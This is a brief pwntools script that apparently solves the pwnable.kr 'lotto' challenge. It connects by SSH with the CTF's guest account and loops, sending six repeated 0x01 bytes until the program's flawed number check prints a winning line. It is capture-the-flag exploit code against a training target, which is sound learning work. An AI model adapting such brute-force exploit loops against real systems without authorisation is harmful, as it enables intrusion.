from pwn import *

s = ssh('lotto', 'pwnable.kr', 2222, 'guest')
p = s.process('./lotto')
while True:
    p.recvuntil("3. Exit\n")
    p.sendline(b"1")
    p.sendafter(b" : ", b'\x01\x01\x01\x01\x01\x01')
    p.recvline()
    line = p.recvline()
    if line == b"bad luck...\n":
        continue
    else:
        print(line)
        break